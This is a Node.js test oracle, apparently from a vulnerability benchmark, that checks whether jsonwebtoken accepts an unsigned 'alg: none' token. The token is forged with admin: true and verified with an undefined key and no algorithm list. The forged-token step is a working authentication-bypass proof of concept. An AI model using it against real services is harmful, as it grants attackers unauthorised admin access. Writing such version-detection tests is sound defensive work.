const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: normal signed token verification should work.
  const benignPayload = { role: 'user', marker: 'benign-ok' };
  const benignSecret = 'oracle-benign-secret';
  const benignToken = jwt.sign(benignPayload, benignSecret, { algorithm: 'HS256' });
  const benignDecoded = jwt.verify(benignToken, benignSecret, { algorithms: ['HS256'] });

  if (!benignDecoded || benignDecoded.role !== 'user' || benignDecoded.marker !== 'benign-ok') {
    throw new Error('Benign verify returned unexpected payload');
  }

  operation_completed = true;

  // Malicious operation: unsigned token + falsy key + no algorithms.
  // This should be accepted on vulnerable versions and rejected on patched versions.
  const maliciousToken = jwt.sign({ admin: true, marker: 'none-bypass' }, '', { algorithm: 'none' });

  try {
    const decoded = jwt.verify(maliciousToken, undefined);
    exploit_succeeded = !!(decoded && decoded.admin === true && decoded.marker === 'none-bypass');
    evidence = exploit_succeeded
      ? 'Unsigned token accepted with falsy key and default algorithms'
      : 'Unsigned token verify returned without expected attacker-controlled payload';
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'Unsigned token was rejected when verified with falsy key';
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Setup/benign path failed: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
